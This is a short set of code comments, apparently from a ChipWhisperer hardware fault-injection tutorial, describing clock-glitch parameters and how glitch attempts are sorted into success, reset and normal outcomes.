## Glitch Module Parameters
# offset: Where in the output clock to place the glitch. Can be in the range [-48.8, 48.8]
# width: How wide to make the glitch. Can be in the range [-50, 50].
# ext_offset: The number of clock cycles after the trigger to put the glitch.
# repeat: The number of clock cycles to repeat the glitch for. 
#         Higher values increase the number of instructions that can be glitched
#         , but often increase the risk of crashing the target.
# trigger_src: How to trigger the glitch.

## CW Glitch Controller
# Potential Results:
#    "success": where our glitch had the desired effect
#    "reset":   where our glitch had an undesirable effect. Often,
#               this effect is crashing or resetting the target, which is why we're calling it "reset"
#    "normal":  where you glitch didn't have a noticable effect.

# gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset", "tries"])
